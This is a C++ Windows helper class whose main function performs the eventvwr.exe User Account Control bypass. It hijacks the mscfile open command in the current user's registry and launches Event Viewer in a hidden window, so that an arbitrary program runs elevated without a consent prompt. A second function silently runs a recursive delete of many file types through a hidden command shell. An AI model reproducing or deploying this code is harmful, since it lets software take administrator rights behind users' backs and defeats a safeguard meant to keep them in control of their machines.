#include "UACHelper.h"

bool UACHelper::IsAdmin() {
	bool bElevated = false;
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
		return false;
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen)) {
		if (dwRetLen == sizeof(tokenEle))
			bElevated = tokenEle.TokenIsElevated;
	}
	CloseHandle(hToken);
	return bElevated;
}

LSTATUS UACHelper::BypassUacRun(LPCTSTR szPath) {
	ULONG len = 0;
	len = lstrlen(szPath);
#ifdef UNICODE
	len *= 2;
#endif
	LSTATUS ret = SHSetValue(HKEY_CURRENT_USER, TEXT("Software\\Classes\\mscfile\\shell\\open\\command"), NULL, REG_SZ, szPath, len);
	ShellExecute(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("/c eventvwr.exe"), NULL, SW_HIDE);
	return ret;
}

void UACHelper::CleanUp() {
	ShellExecute(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("del /s/a *.ncb;*.opt;*.plg;*.aps;*.pch;*.ipch;*.ilk;*.sbr;*.idb;*.pdb;*.obj;*.res;*.suo;*.bbs;*.sdf;"), NULL, SW_HIDE);
}